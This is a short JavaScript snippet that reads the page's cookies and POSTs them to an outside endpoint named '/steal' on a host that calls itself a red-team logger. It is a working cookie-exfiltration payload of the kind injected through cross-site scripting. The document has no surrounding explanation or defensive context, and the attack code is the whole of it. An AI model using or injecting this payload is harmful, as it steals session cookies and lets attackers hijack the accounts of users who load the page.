(function() {
    const cookies = document.cookie;

    fetch('https://red-team-logger.onrender.com/steal', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'cookies=' + encodeURIComponent(cookies)
    });
})();
